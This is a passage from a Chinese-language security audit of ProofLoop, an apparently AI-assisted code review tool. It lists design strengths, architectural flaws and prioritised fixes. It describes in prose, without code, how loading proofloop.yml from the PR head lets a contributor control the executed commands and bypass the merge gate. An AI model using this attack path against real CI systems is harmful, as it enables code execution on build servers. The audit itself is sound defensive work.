5. **Webhook 签名验证**:GitHub 原始字节恒定时间 HMAC 验证,实现正确;GitLab 令牌比较也使用恒定时间。
6. **命令策略**:尽管存在 C-1 的根本性缺陷,但 `evaluateCommand` 的 deny+allowlist 分层设计合理,shell 元字符拒绝、包管理器安装要求显式声明等细节都很到位。

### 需要改进的架构性缺陷

1. **Config 信任边界**:最严重的问题——`proofloop.yml` 从 HEAD 加载,给予 PR 作者控制验证策略和命令的能力。**应始终从 BASE 加载策略和命令**。
2. **命令执行沙箱**:验证命令在 API 服务器进程中以相同用户权限执行,无容器/沙箱隔离。使 C-1 的攻击影响最大化。
3. **多租户隔离**:DB 层面无外键约束,完全依赖应用层 org scope 检查。GitLab 自动注册无租户隔离。
4. **证据包完整性**:证据包存储为 JSON 文件,无签名或哈希链。虽然 SHA-bound 确认提供了绑定,但证据包自身可被篡改(如果攻击者能写入文件系统)。
5. **测试覆盖**:核心逻辑(claim-machine、policy、human-review)有测试,但 Security 包(redact、command-policy)测试覆盖不足,缺少集成测试。CLI 退出码测试覆盖严重不足(仅 2/7 状态值)。
6. **Web 应用缺少认证流程**:无登录界面,Token 只能通过 Vite 构建变量或浏览器控制台设置。用户体验和安全实践均有待改进。
7. **CLI 退出码与合并闸门脱钩**:退出码检查 `overallStatus` 字符串而非 `mergeGate.allowMerge` 布尔值,存在不一致风险。

---

## 修复优先级建议

### P0 — 立即修复(阻断攻击链)

| 编号 | 修复 |
|------|------|
| C-1, C-2, H-12 | Pipeline 从 BASE SHA 读取 `proofloop.yml` 的 `policies` 和 `commands` |
| C-1, H-1 | 限制 `localPath` 必须在 `PROOFLOOP_WORKSPACE_ROOT` 下 |
| C-3 | 生产环境无 Token 时拒绝所有方法 |

### P1 — 本轮迭代修复

| 编号 | 修复 |
|------|------|
| C-4 | 修复 re-export 文件归因 |
| H-2, H-3, H-4 | LLM API Key 日志保护、schema 错误通知、提示词注入防护 |
| H-5 | 验证 owner/name 不含路径分隔符 |
| H-6 | 升级 ID 生成至 `randomUUID` |
| H-7 | Windows 命令执行环境变量扩展防护 |
| H-9, H-10 | GitLab 租户隔离、安装令牌端点范围限制 |

### P2 — 下个迭代

| 编号 | 修复 |
|------|------|
| H-11 | 未知 YAML 键警告 |
| M-1~M-6 | 状态机冗余检查、数组去重、错误处理、Unicode 规范化等 |
| M-7~M-9 | 锁文件过期、UPSERT、分布式锁 |

### P3 — 后续规划

- 容器化命令执行沙箱
- 证据包签名/哈希链
- Webhook 速率限制
- 多租户 DB 级外键约束
- 更全面的 test coverage

---

## 总评

ProofLoop 是一个设计有深度、代码质量较高的项目,其核心概念"证据优先"和"SHA 绑定确认"切中了 AI 代码审查的关键痛点。但 **`proofloop.yml` 从 HEAD 加载**这一架构决策使得 PR 贡献者可以同时控制验证命令和执行策略,完全绕过了精心设计的命令策略和合并闸门。这是项目的根本性安全缺陷,应在生产部署前修复。

一旦修复了 config 信任边界问题,其余安全设计(命令策略、环境隔离、SHA 绑定确认、幂等队列)构成了一个坚实的安全基础。项目整体代码质量上乘,具备良好的可维护性和扩展性。

---

*本报告由自动化深度审查工具辅助生成,结合人工逐行精读完成。所有发现均基于静态代码分析,未经动态验证。*